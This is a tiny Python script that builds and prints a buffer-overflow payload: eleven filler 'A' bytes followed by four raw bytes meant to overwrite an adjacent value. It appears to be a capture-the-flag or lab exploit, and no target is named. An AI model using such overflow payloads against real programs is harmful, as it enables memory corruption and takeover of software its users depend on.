#!/usr/bin/python3

buf = "A"*11
payload = buf+"\x42\x00\x13\x37"

print(payload)
